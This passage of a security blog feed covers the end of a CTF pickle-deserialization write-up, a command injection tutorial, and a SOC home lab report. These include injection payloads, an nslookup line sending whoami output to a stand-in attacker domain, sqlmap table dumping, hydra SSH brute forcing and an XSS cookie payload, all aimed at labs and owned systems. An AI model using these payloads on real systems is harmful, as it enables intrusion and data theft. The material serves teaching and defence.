chain</h2><ol><li><code>GLOBAL collections _itemgetter</code> → <code>operator.itemgetter</code></li><li><code>GLOBAL collections __builtins__</code> → the real builtins dict</li><li>Pull <code>vars</code>, <code>type</code>, <code>open</code>, <code>print</code>, <code>chr</code>, <code>str</code> and <code>len</code> out of that dict via <code>itemgetter</code></li><li>Build the integer <code>46</code> from <code>len(&quot;q&quot;*20 + &quot;q&quot;*26)</code>, then <code>chr(46)</code> → <code>&quot;.&quot;</code></li><li>Assemble <code>[&quot;/app/fl&quot;, &quot;ag&quot;, &quot;.&quot;, &quot;txt&quot;]</code> as a pickle list, join with <code>&quot;&quot;</code></li><li><code>open(path)</code> → file handle</li><li><code>vars(type(fh))[&#39;read&#39;](fh)</code> → file contents, with no dot and no <code>getattr</code></li><li><code>print(contents)</code> → lands in the app’s captured stdout, returned in the JSON response</li><li>Every call uses <code>OBJ</code>, never <code>REDUCE</code>, and the stream has no <code>STOP</code></li></ol><h2 id="Proof-of-concept"><a href="#Proof-of-concept" class="headerlink" title="Proof of concept"></a>Proof of concept</h2><p>Rather than hand-write raw pickle bytes, I built a small opcode assembler (<code>MARK</code>, <code>SHORT_BINUNICODE</code>, <code>GLOBAL</code>, <code>OBJ</code>, <code>BINPUT</code>&#x2F;<code>BINGET</code> for memoization, <code>EMPTY_LIST</code>&#x2F;<code>APPENDS</code>) and tested the full chain against an exact local copy of <code>check()</code>, <code>RestrictedUnpickler</code> and <code>restore()</code> taken from the provided <code>webapp.py</code>, on Python 3.12.3 to match <code>python:3.12-slim</code>.</p><p>First I proved the mechanics against a local test file with a dot-free name, where the full reflection chain worked and printed the file contents correctly. Then I proved the obfuscated path reconstruction against a local file deliberately named with “flag” and “.” in it, confirming the payload passed the banned-substring filter and still printed the right contents. Only then did I swap the path fragments to target <code>/app/flag.txt</code> for the real submission.</p><h2 id="Final-payload"><a href="#Final-payload" class="headerlink" title="Final payload"></a>Final payload</h2><p>Submit as the <code>payload</code> field to <code>/restore</code>:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST https://&lt;target-host&gt;/restore \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;payload&quot;:&quot;&lt;the base64 above&gt;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>The <code>output</code> field of the JSON response contains the flag.</p><h2 id="Key-techniques"><a href="#Key-techniques" class="headerlink" title="Key techniques"></a>Key techniques</h2><ul><li><code>REDUCE</code> isn’t the only pickle opcode that calls a callable. <code>OBJ</code>, protocol 0’s <code>cls(*args)</code> form, works identically and shows up as a distinct opcode name in <code>pickletools.dis</code> output.</li><li>A whitelisted, safe-looking module can still leak dangerous references. Always check what a module quietly imports at its own top level with <code>inspect.getsource</code>, not just its documented public API.</li><li><code>vars(obj)</code> (which gives <code>obj.__dict__</code>) plus a subscript primitive like <code>operator.itemgetter</code> together form a full generic attribute-read gadget that needs neither dot syntax nor <code>getattr</code>.</li><li>Pickle’s <code>STOP</code> opcode is the literal byte <code>.</code>, so a filter banning <code>.</code> forces every payload to end abruptly. Check whether the app’s exception handling around <code>Unpickler.load()</code> tolerates that before assuming it’s fatal.</li><li>Never embed a sensitive integer or string literally if a filter can see it. Compute it at runtime, for example via <code>len()</code> of unrelated strings, so it only exists in memory during execution and never in the bytes you send.</li></ul><hr><h2 id="Closing-Thoughts"><a href="#Closing-Thoughts" class="headerlink" title="Closing Thoughts"></a>Closing Thoughts</h2><p>Two flags, both easy web. That’s the whole result for this one, and there’s no reason to dress it up as more than it was.</p><p>What made both worth the time was that neither gave up its flag to the obvious first move. sqlmap ran for over 30 minutes against Slop Slop Go Away and found nothing, because the bug wasn’t in the SQL at all, it was three lines of PHP below the query. Time Capsule blocked the pickle opcode everyone reaches for first and left an older one sitting right next to it, unblocked. In both cases the fix came from rereading the source slowly instead of trusting the first tool that came to hand, and Time Capsule even caught me making the same kind of mistake once, when an early payload leaked the banned byte <code>0x2e</code> straight into the pickle stream through a <code>BININT1</code> opcode.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL Injection </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
            <tag> Blind SQLi </tag>
            
            <tag> Pickle </tag>
            
            <tag> Deserialization </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS Command Injection</title>
      <link href="/2026/08/29/Command-Injection/"/>
      <url>/2026/08/29/Command-Injection/</url>
      
        <content type="html"><![CDATA[<blockquote><p> <strong>Difficulty</strong>: <span style="color:#9fef00">Apprentice</span> → <span style="color:#9fef00">Practitioner</span></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Command injection happens when an application takes user input and hands it straight to a shell, expecting it to stay put as one clean argument. Shells don’t work that way. A handful of characters and your “product ID” becomes a second, unrelated command running with the same privileges as the web server.</p><p>This path covers spotting it, exploiting it when the output comes back to you, and exploiting it blind when it doesn’t.</p><span id="more"></span><h2 id="Why-It-Happens"><a href="#Why-It-Happens" class="headerlink" title="Why It Happens"></a>Why It Happens</h2><p>Some applications still shell out to system binaries instead of using a library or API, usually for legacy reasons, a script nobody wants to rewrite, or a “quick” feature that grew teeth. A stock-checker might look like this internally:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockreport.pl 381 29</span><br></pre></td></tr></table></figure><p>Nothing wrong with that on its own. The problem is what happens when <code>29</code> is actually attacker-controlled input that never gets validated.</p><h2 id="A-Simple-Case"><a href="#A-Simple-Case" class="headerlink" title="A Simple Case"></a>A Simple Case</h2><p>Drop a shell metacharacter into a parameter and the shell treats whatever follows as a brand new command:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp; echo aiwefwlguh &amp;</span><br></pre></td></tr></table></figure><p>If that lands in <code>productID</code>, the shell actually executes:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stockreport.pl &amp; echo aiwefwlguh &amp; 29</span><br></pre></td></tr></table></figure><p>Three commands run back to back. <code>stockreport.pl</code> fails because it’s missing its argument, <code>echo</code> prints the marker string proving the injection worked, and <code>29</code> errors out as an unrecognized command. That’s the whole giveaway, an echoed string that has no business appearing in a stock report response.</p><p>In the corresponding lab, the same idea applies to the <code>storeId</code> parameter, except instead of proving execution with a marker string, the goal is reading <code>whoami</code> directly out of the response:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params[<span class="string">&#x27;storeId&#x27;</span>] += <span class="string">&quot;|whoami&quot;</span></span><br><span class="line">resp = session.post(url, data=params, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>One pipe character, and the response you get back is <code>whoami</code>‘s output instead of the store status. <a href="https://github.com/0xkoat/portswigger_scripts/blob/main/Command_Injection/lab1.py">Full script here.</a></p><h2 id="When-Nothing-Comes-Back-Blind-Injection"><a href="#When-Nothing-Comes-Back-Blind-Injection" class="headerlink" title="When Nothing Comes Back: Blind Injection"></a>When Nothing Comes Back: Blind Injection</h2><p>Most real targets won’t print your command’s output back into the page. That doesn’t mean the injection failed. It means you need a different way to notice it worked.</p><h3 id="Time-Delays"><a href="#Time-Delays" class="headerlink" title="Time Delays"></a>Time Delays</h3><p><code>ping</code> is the easiest signal there is: tell it to send ten packets, and the response takes roughly ten seconds longer than it should:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||ping -c 10 127.0.0.1||</span><br></pre></td></tr></table></figure><p>You don’t need any output for this one. If a request that normally returns instantly suddenly takes ten extra seconds, the command ran.</p><p>The feedback form lab injects this into the <code>email</code> field and just times the response:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">f&quot;<span class="subst">&#123;ou&#125;</span>ping<span class="subst">&#123;space&#125;</span>-c<span class="subst">&#123;time&#125;</span><span class="subst">&#123;space&#125;</span><span class="subst">&#123;localhost&#125;</span><span class="subst">&#123;ou&#125;</span>&quot;</span></span><br><span class="line">params[<span class="string">&quot;email&quot;</span>] += exploit</span><br></pre></td></tr></table></figure><p>Wrapping the request in a thread and polling <code>time.monotonic()</code> while it’s in flight makes the delay obvious without guessing. <a href="https://github.com/0xkoat/portswigger_scripts/blob/main/Command_Injection/lab2.py">Script here.</a></p><h3 id="Redirecting-Output-to-a-File-You-Can-Reach"><a href="#Redirecting-Output-to-a-File-You-Can-Reach" class="headerlink" title="Redirecting Output to a File You Can Reach"></a>Redirecting Output to a File You Can Reach</h3><p>If the app happens to serve static files from somewhere on disk, point the command’s output at a file inside that directory and fetch it afterward:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||whoami&gt;/var/www/images/whoami.txt||</span><br></pre></td></tr></table></figure><p>The <code>&gt;</code> sends <code>whoami</code>‘s output straight to a file the web server will happily hand back on the next request. Same feedback form, same injection point, except this time the payload writes to disk instead of stalling the response, and a follow-up <code>GET</code> to the image endpoint reads the result:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exploit = <span class="string">f&quot;<span class="subst">&#123;ou&#125;</span>whoami<span class="subst">&#123;redirect&#125;</span><span class="subst">&#123;filepath&#125;</span><span class="subst">&#123;filename&#125;</span><span class="subst">&#123;ou&#125;</span>&quot;</span></span><br><span class="line"><span class="comment"># ...submit, then:</span></span><br><span class="line">session.get(image_url + filename, verify=<span class="literal">False</span>).text.strip()</span><br></pre></td></tr></table></figure><p><a href="https://github.com/0xkoat/portswigger_scripts/blob/main/Command_Injection/lab3.py">Script here.</a></p><h3 id="Out-of-Band-When-Neither-of-Those-Work"><a href="#Out-of-Band-When-Neither-of-Those-Work" class="headerlink" title="Out-of-Band, When Neither of Those Work"></a>Out-of-Band, When Neither of Those Work</h3><p>When there’s no writable web root and no observable timing difference, the last option is forcing the server to reach out to infrastructure you control, usually with <code>nslookup</code>:</p><figure class="highlight plaintext"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||nslookup $(whoami).kgji2ohoyw.web-attacker.com||</span><br></pre></td></tr></table></figure><p>The lookup itself confirms execution, and since <code>$(whoami)</code> gets resolved before the DNS query fires, the subdomain that shows up on your listener <em>is</em> the command’s output. This needs an external collaborator rather than a plain script, so it’s not part of the repo above. Burp Suite ships one built in, but only in the Professional edition, Community doesn’t include Collaborator. Still worth knowing conceptually, even without a script to point at.</p><div class="note info flat"><p><code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, and <code>||</code> all work cross-platform. <code>;</code> and newline injection are Unix-only. Backticks and <code>$(...)</code> give you inline execution instead of chaining, useful when you need the injected command’s <em>output</em> to feed into the original one, as in the OAST example above.</p></div><h2 id="How-To-Prevent-It"><a href="#How-To-Prevent-It" class="headerlink" title="How To Prevent It"></a>How To Prevent It</h2><ul><li>Don’t call out to the OS from application code if there’s any way around it. Most “shell out to a binary” functionality has a native library equivalent.</li><li>If shelling out is unavoidable, validate hard: allowlist known-good values, or restrict input to alphanumeric characters only.</li><li>Don’t try to sanitize by escaping shell metacharacters yourself. It’s a losing game against a determined attacker; there’s always a metacharacter you forgot to escape.</li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Command injection is one of the few bug classes where blind exploitation is often <em>easier</em> to reason about than the in-band version. A <code>ping</code> delay or a DNS lookup doesn’t care whether the app reflects anything back to you. The three cases here (visible output, timing, and file write) cover most of what shows up in the wild; out-of-band is the fallback once the other two are dead ends.</p><div class="note info flat"><p>Scripted these instead of solving through the UI, same as always, it forces you to actually understand what each payload depends on rather than pattern-matching a button in Burp. Repo here: <a href="https://github.com/0xkoat/portswigger_scripts/tree/main/Command_Injection">Command Injection Scripts Repo</a></p></div><p>Have a nice day, and see you again in the next article!<br>Any feedback in the comments section is very appreciated.<br>Thank you for your attention.</p>]]></content>
      
      
      <categories>
          
          <category> Portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Command Injection </tag>
            
            <tag> Portswigger </tag>
            
            <tag> Web Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SOC Home Lab Project</title>
      <link href="/2026/08/03/SOC-Home-Lab-Project/"/>
      <url>/2026/08/03/SOC-Home-Lab-Project/</url>
      
        <content type="html"><![CDATA[<p><code>OPNsense</code> · <code>Azure (VNet / NSG)</code> · <code>Wazuh 4.14</code> · <code>Docker</code> · <code>DVWA</code> · <code>Kali Linux</code> · <code>PowerShell</code> · <code>MITRE ATT&amp;CK</code> · <code>VirtualBox</code> · <code>Windows 11</code> · <code>Ubuntu 22.04</code> · <code>sqlmap</code> · <code>hydra</code> · <code>nmap</code></p><h2 id="Executive-Summary"><a href="#Executive-Summary" class="headerlink" title="Executive Summary"></a>Executive Summary</h2><p>This project is a hybrid Security Operations Center home lab, built to demonstrate both sides of the job a SOC analyst actually does: designing and enforcing network segmentation, and then running real attacks against it to find and close the gaps in what the SIEM actually catches.</p><p>The architecture splits deliberately across two environments. Network segmentation and endpoint control stay local, on VirtualBox behind an OPNsense firewall, mirroring how a real organization separates its internal network from everything else. The SIEM stack and the vulnerable&#x2F;attacker infrastructure (Wazuh, a Linux DMZ target, and a Kali attacker box) run on Azure. The two environments talk to each other only over the public internet, each independently enforcing its own default-deny model.</p><p>Four attack scenarios were run against this environment, rising in complexity and mapped explicitly to MITRE ATT&amp;CK: network reconnaissance, an SSH credential-guessing attack, web application exploitation against DVWA (SQL injection, command injection, reflected XSS), and a Windows living-off-the-land technique chain. Every scenario followed the same loop: predict the expected detection outcome, attack, check the manager’s logs directly.</p><p>The headline result is that I found three distinct, well-understood detection gaps: one structural (a host-based SIEM has no visibility into network-layer reconnaissance), one a genuine misconfiguration (a manager logging flag left at its default, silently invalidating a whole category of evidence until caught), and one a missing detection rule (a custom PowerShell&#x2F;LOLBin rule that I wrote, loaded, and proved catches two distinct techniques on first attempt). That loop (attack, predict, verify, diagnose, fix, re-verify) is the actual job, and it’s the throughline of this write-up.</p><span id="more"></span><hr><h2 id="MITRE-ATT-CK-Coverage"><a href="#MITRE-ATT-CK-Coverage" class="headerlink" title="MITRE ATT&amp;CK Coverage"></a>MITRE ATT&amp;CK Coverage</h2><table><thead><tr><th>Technique ID</th><th>Technique</th><th>Scenario</th><th>Tactic</th></tr></thead><tbody><tr><td><code>T1046</code></td><td>Network Service Discovery</td><td>1 · Recon &#x2F; Scanning</td><td>Discovery</td></tr><tr><td><code>T1110.001</code></td><td>Password Guessing</td><td>2 · SSH Brute Force</td><td>Credential Access</td></tr><tr><td><code>T1190</code></td><td>Exploit Public-Facing Application</td><td>3 · DVWA (SQLi &#x2F; Command Injection &#x2F; XSS)</td><td>Initial Access</td></tr><tr><td><code>T1105</code></td><td>Ingress Tool Transfer</td><td>4 · Windows LOTL (certutil)</td><td>Command and Control</td></tr><tr><td><code>T1059.001</code></td><td>PowerShell</td><td>4 · Windows LOTL (encoded command)</td><td>Execution</td></tr><tr><td><code>T1027</code></td><td>Obfuscated Files or Information</td><td>4 · Windows LOTL (encoded command)</td><td>Defense Evasion</td></tr></tbody></table><hr><h2 id="Network-Architecture-—-A-Deep-Dive"><a href="#Network-Architecture-—-A-Deep-Dive" class="headerlink" title="Network Architecture — A Deep Dive"></a>Network Architecture — A Deep Dive</h2><p>Networking is the part of this project I wanted to get right the most, and it’s the piece that ends up doing double duty: it’s a real technical design decision, and it’s also the reason several of the most interesting findings in the attack scenarios exist at all. Two independent systems enforce segmentation here (OPNsense locally, Azure NSGs in the cloud), and the interesting part isn’t that they’re similar. It’s that they achieve the same goal from opposite starting points.</p><h3 id="The-local-segment-—-OPNsense"><a href="#The-local-segment-—-OPNsense" class="headerlink" title="The local segment — OPNsense"></a>The local segment — OPNsense</h3><p>OPNsense is a free, FreeBSD-based firewall&#x2F;router OS (a fork of pfSense) using the <code>pf</code> packet filter engine, running as its own VirtualBox VM. Its only job is routing and filtering traffic between the lab’s local network segments.</p><table><thead><tr><th>Interface</th><th>VirtualBox network type</th><th>IP address</th><th>Purpose</th></tr></thead><tbody><tr><td>WAN</td><td>NAT</td><td>DHCP</td><td>Internet access for OPNsense itself</td></tr><tr><td>LAN</td><td>Internal (<code>intnet:mgmt</code>)</td><td>192.168.1.1&#x2F;24</td><td>Management segment</td></tr><tr><td>OPT1</td><td>Internal (<code>intnet:internal</code>)</td><td>192.168.2.1&#x2F;24</td><td>Internal segment, Windows 11 endpoint</td></tr><tr><td>OPT2</td><td>Internal (<code>intnet:dmz</code>)</td><td>192.168.3.1&#x2F;24</td><td>DMZ segment, superseded by the cloud DMZ target</td></tr><tr><td>OPT3</td><td>Host-only</td><td>192.168.56.2&#x2F;24</td><td>Laptop → OPNsense GUI&#x2F;SSH access</td></tr></tbody></table><p>The key design decision: <strong>every interface except LAN starts completely blank (default-deny, nothing passes, not even ping) until an explicit Pass rule is added.</strong> Only LAN gets an automatic allow-all rule at install. This is what makes the segmentation meaningful rather than cosmetic: a compromised device on one segment genuinely cannot reach another unless a rule explicitly says so.</p><h3 id="The-cloud-segment-—-Azure-NSGs"><a href="#The-cloud-segment-—-Azure-NSGs" class="headerlink" title="The cloud segment — Azure NSGs"></a>The cloud segment — Azure NSGs</h3><p>The Azure side (<code>soc-network</code> VNet, <code>10.0.0.0/16</code>, three subnets: <code>mgmt-subnet</code>, <code>dmz-subnet</code>, <code>attacker-subnet</code>) is designed to mirror the same default-deny philosophy. But Azure’s Network Security Groups start from the <em>opposite</em> default than OPNsense does, and missing that distinction is a real, easy-to-make mistake:</p><blockquote><p>⚠️ <strong>Azure NSGs ship with a built-in <code>AllowVnetInBound</code> rule at priority 65000, permitting all intra-VNet traffic by default.</strong> Unlike OPNsense’s blank slate, segmentation between subnets in the same VNet has to be <em>added back in</em>: an explicit <code>Deny-VNet-Default</code> rule at a lower priority than 65000 is required on every NSG, or every VM in the VNet can freely reach every other VM regardless of anything else configured.</p></blockquote><table><thead><tr><th>Priority</th><th>Name</th><th>Source</th><th>Port</th><th>Action</th></tr></thead><tbody><tr><td>101</td><td>Allow-DVWA-Attacker</td><td><code>10.0.3.0/24</code></td><td>80</td><td>Allow</td></tr><tr><td>102</td><td>Allow-DVWA-HomeIP</td><td>home IP <code>/32</code></td><td>80</td><td>Allow</td></tr><tr><td>105</td><td>Allow-SSH-HomeIP</td><td>home IP <code>/32</code></td><td>22</td><td>Allow</td></tr><tr><td>120</td><td><strong>Deny-VNet-Default</strong></td><td>VirtualNetwork</td><td>*</td><td><strong>Deny</strong></td></tr></tbody></table><p><em>(<code>dmz-nsg</code> shown above; <code>mgmt-nsg</code> and <code>attacker-nsg</code> follow the identical pattern: narrowly-scoped Allow rules for specific sources and ports, backstopped by the same <code>Deny-VNet-Default</code> at priority 120.)</em></p><hr><h2 id="Build-Summary"><a href="#Build-Summary" class="headerlink" title="Build Summary"></a>Build Summary</h2><p>This table is the reference.</p><h3 id="Azure-VM-inventory"><a href="#Azure-VM-inventory" class="headerlink" title="Azure VM inventory"></a>Azure VM inventory</h3><table><thead><tr><th>VM</th><th>Subnet</th><th>Private IP</th><th>Role</th></tr></thead><tbody><tr><td><code>wazuh-manager</code></td><td>mgmt-subnet</td><td>10.0.1.4</td><td>SIEM, Wazuh 4.14, all-in-one</td></tr><tr><td><code>dmz-target</code></td><td>dmz-subnet</td><td>10.0.2.4</td><td>Vulnerable target (DVWA via Docker), Wazuh agent 001</td></tr><tr><td><code>kali-attacker</code></td><td>attacker-subnet</td><td>10.0.3.4</td><td>Attack box</td></tr></tbody></table><h3 id="Full-endpoint-inventory"><a href="#Full-endpoint-inventory" class="headerlink" title="Full endpoint inventory"></a>Full endpoint inventory</h3><table><thead><tr><th>Endpoint</th><th>Location</th><th>Agent ID</th><th>Status</th></tr></thead><tbody><tr><td><code>wazuh-manager</code></td><td>Azure (mgmt-subnet)</td><td>—</td><td>SIEM, running</td></tr><tr><td><code>dmz-target</code></td><td>Azure (dmz-subnet)</td><td>001</td><td>Active</td></tr><tr><td><code>kali-attacker</code></td><td>Azure (attacker-subnet)</td><td>—</td><td>Segmentation verified</td></tr><tr><td>Windows 11 Endpoint</td><td>Local (OPT1)</td><td>002</td><td>Active</td></tr></tbody></table><hr><h2 id="Attack-Scenarios"><a href="#Attack-Scenarios" class="headerlink" title="Attack Scenarios"></a>Attack Scenarios</h2><p>Four scenarios, rising in complexity, each mapped to MITRE ATT&amp;CK. Every one followed the same loop: predict the expected outcome → attack → check the manager’s <code>alerts.log</code> directly (the authoritative source) → corroborate in the dashboard → record a verdict → fix what’s fixable → re-test.</p><h3 id="Scenario-1-—-Recon-Scanning"><a href="#Scenario-1-—-Recon-Scanning" class="headerlink" title="Scenario 1 — Recon &#x2F; Scanning"></a>Scenario 1 — Recon &#x2F; Scanning</h3><p><strong>Technique:</strong> <code>T1046</code> – Network Service Discovery · <strong>Tool:</strong> <code>nmap -sC -sV -Pn</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -Pn 10.0.2.4          <span class="comment"># private IP, from Kali</span></span><br><span class="line">nmap -sC -sV -Pn 158.158.34.78     <span class="comment"># public IP, for comparison</span></span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario1-nmap.png" alt="nmap scan results against the DMZ target&#39;s private and public IPs"></p><p><strong>Results:</strong></p><ul><li>Private IP: <code>22/tcp open (ssh)</code>, <code>80/tcp open (http, DVWA)</code>, <code>3000/tcp closed</code>, 997 filtered</li><li>Public IP: all 1000 ports filtered</li></ul><p>Checking the manager:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -iE <span class="string">&quot;10.0.3.4&quot;</span> /var/ossec/logs/archives/archives.log</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario1-archives-empty.png" alt="Empty archives.log after the nmap scan"></p><blockquote><p>🔴 <strong>Detected? Missed.</strong> Expected, not a misconfiguration. Wazuh is host-based (HIDS); it has no visibility into inbound network connection attempts that don’t generate a log entry the agent watches.<br>Detecting this class of activity would require a network-layer component (Suricata&#x2F;Zeek), out of scope for this build. Documented as a known limitation rather than remediated.</p></blockquote><hr><h3 id="Scenario-2-—-SSH-Brute-Force"><a href="#Scenario-2-—-SSH-Brute-Force" class="headerlink" title="Scenario 2 — SSH Brute Force"></a>Scenario 2 — SSH Brute Force</h3><p><strong>Technique:</strong> <code>T1110.001</code> – Password Guessing · <strong>Tool:</strong> <code>hydra</code></p><p><code>dmz-target</code>‘s <code>sshd_config</code> turned out to already have <code>PasswordAuthentication yes</code><br><code>azureuser</code>‘s password was set to a deliberately weak value for the duration of this scenario only, reset immediately afterward.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l azureuser -P /tmp/passlist.txt ssh://10.0.2.4 -t 4</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario2-hydra.png" alt="hydra SSH brute force run against the DMZ target"></p><p>Succeeded in 3 failed attempts before the hit: the weak password was the 4th entry in a 6-word test list, found quickly via 4 parallel connection attempts rather than a long sequential grind.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -iE <span class="string">&quot;5710|5716|5720|sshd&quot;</span> /var/ossec/logs/alerts/alerts.log | <span class="built_in">tail</span> -40</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario2-archives.png" alt="alerts.log entries for the SSH brute force attempts"></p><p><img src="/img/soc-scenario2-dashboard.png" alt="Wazuh dashboard view of the SSH authentication alerts"></p><hr><h3 id="Scenario-3-—-DVWA-Web-Exploitation"><a href="#Scenario-3-—-DVWA-Web-Exploitation" class="headerlink" title="Scenario 3 — DVWA Web Exploitation"></a>Scenario 3 — DVWA Web Exploitation</h3><p><strong>Technique:</strong> <code>T1190</code> – Exploit Public-Facing Application · <strong>Sub-techniques:</strong> SQL Injection (CWE-89), Command Injection (CWE-78), Reflected XSS (CWE-79) · <strong>Tools:</strong> <code>curl</code>, <code>sqlmap</code></p><p>Before attacking, I checked <code>dmz-target</code>‘s <code>ossec.conf</code> and found its <code>&lt;localfile&gt;</code> entries cover host-level sources only: nothing references Apache, DVWA, or Docker. DVWA runs in a container; its logs go to the container’s own stdout&#x2F;stderr, invisible to a default host-based agent config.</p><p>I flagged this as a single structural gap <em>before</em> attacking, predicted to affect all three sub-techniques for the same reason.</p><h4 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.0.2.4/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;PHPSESSID=...; security=low&quot;</span> --batch --dump -D dvwa -T <span class="built_in">users</span></span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario3-sqli.png" alt="sqlmap dumping the DVWA users table via SQL injection"></p><h4 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -b dvwa_cookies.txt -d <span class="string">&quot;ip=127.0.0.1%3Bwhoami&amp;Submit=Submit&amp;user_token=...&quot;</span> \</span><br><span class="line">  http://10.0.2.4/vulnerabilities/exec/</span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario3-command-injection-1.png" alt="Command injection request against DVWA&#39;s exec vulnerability"></p><p><img src="/img/soc-scenario3-command-injection-2.png" alt="Command injection response showing whoami output"></p><h4 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b dvwa_cookies.txt <span class="string">&quot;http://10.0.2.4/vulnerabilities/xss_r/?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/soc-scenario3-xss.png" alt="Reflected XSS payload against DVWA"></p><h4 id="Detection-—-initial-pass"><a href="#Detection-—-initial-pass" class="headerlink" title="Detection — initial pass"></a>Detection — initial pass</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -iE <span class="string">&quot;sqlmap|UNION|xss_r|vulnerabilities/exec&quot;</span> /var/ossec/logs/alerts/alerts.log</span><br><span class="line"><span class="built_in">sudo</span> grep -i <span class="string">&quot;vulnerabilities&quot;</span> /var/ossec/logs/archives/archives.log</span><br></pre></td></tr></table></figure><blockquote><p>🔴 <strong>Detected? Missed, all three.</strong> <code>alerts.log</code> produced no genuine matches, both grep attempts only matched the sudo audit trail of the grep command itself, the same self-referential false-positive pattern that shows up repeatedly across this project. <code>archives.log</code> came back completely empty across the full test window, with no self-match risk this time, confirming zero events were forwarded at all.</p></blockquote><h4 id="Root-cause-and-fix"><a href="#Root-cause-and-fix" class="headerlink" title="Root cause and fix"></a>Root cause and fix</h4><p><code>ossec.conf</code>‘s <code>&lt;localfile&gt;</code> entries monitor host-level sources only, as predicted before attacking. Fix: a <code>full_command</code> localfile polling <code>docker logs dvwa --since 20s</code> every 15 seconds, plus enabling <code>&lt;logall&gt;yes&lt;/logall&gt;</code> on the manager. It turned out this had been at its default (<code>no</code>) the entire time, silently limiting what <code>archives.log</code> could ever show across every earlier scenario too.</p><h4 id="Re-test"><a href="#Re-test" class="headerlink" title="Re-test"></a>Re-test</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> grep -i <span class="string">&quot;sqli&quot;</span> /var/ossec/logs/archives/archives.log | <span class="built_in">tail</span> -5</span><br><span class="line"><span class="comment"># 10.0.3.4 - - [..] &quot;GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&amp;Submit=Submit HTTP/1.1&quot; 200 5098</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> grep -i <span class="string">&quot;exec\|whoami&quot;</span> /var/ossec/logs/archives/archives.log | <span class="built_in">tail</span> -20</span><br><span class="line"><span class="comment"># 10.0.3.4 - 